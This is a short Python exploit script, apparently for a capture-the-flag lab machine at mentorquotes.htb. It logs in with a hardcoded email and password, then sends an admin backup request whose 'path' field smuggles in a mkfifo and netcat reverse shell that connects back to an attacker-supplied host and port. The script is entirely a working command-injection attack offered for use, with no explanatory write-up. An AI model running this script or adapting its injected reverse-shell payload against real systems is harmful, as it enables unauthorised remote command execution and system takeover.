import requests
import sys
import json

def login():
	data = {"email":"james@mentorquotes.htb","username":"james","password":"kj23sadkj123as0-d213"}
	res = requests.post('http://api.mentorquotes.htb/auth/login',json=data)
	print('[+] logged in as user james')
	rce(res.json())

def rce(token):
	headers = {'Authorization': token}
	data = {"path":f";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {sys.argv[1]} {sys.argv[2]} >/tmp/f;"}

	print('[+] executing command')
	res = requests.post('http://api.mentorquotes.htb/admin/backup',headers=headers,json=data)
	print(res.text)

try:
	print('[+] trying to login')
	login()
except KeyboardInterrupt:
	print(' exiting')
